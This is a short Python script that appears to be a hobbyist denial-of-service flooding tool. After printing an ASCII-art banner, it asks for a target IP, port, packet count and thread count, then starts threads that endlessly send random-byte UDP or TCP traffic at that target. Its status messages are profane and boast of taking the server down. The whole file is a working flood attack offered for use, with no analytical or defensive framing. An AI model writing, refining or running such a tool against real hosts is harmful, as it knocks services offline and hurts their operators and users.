import random
import socket
import threading
import os

os.system("clear")
print("""
─────────────────╔═╗
─────────────────║╔╝
╔╗╔╗╔╗╔╗╔╗╔╗╔╗╔╗╔╝╚╗
─╣║╚╝║╚╬╬╝║║║║─╣╚╗╔╝
║║║║║║╔╬╬╗║╚╝║║║─║║─
╚╝╚╩╩╝╚╝╚╝╚══╝╚╝─╚╝─""")
ip = str(input("[Enter] Ip:"))
port = int(input("[Enter]| Port:"))
times = int(input("[Enter]| Packets:"))
threads = int(input("[Enter]| Threads:"))
choice = str(input("[Enter] | Enter y (y/n):"))
print("Can i Sent pakets pls enter to start")
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | Fuck Error |")
		except:
			print("[!] | Can i Downin Server|")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Fuck error")
		except:
			s.close()
			print("[*] Stupid This FunTools")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()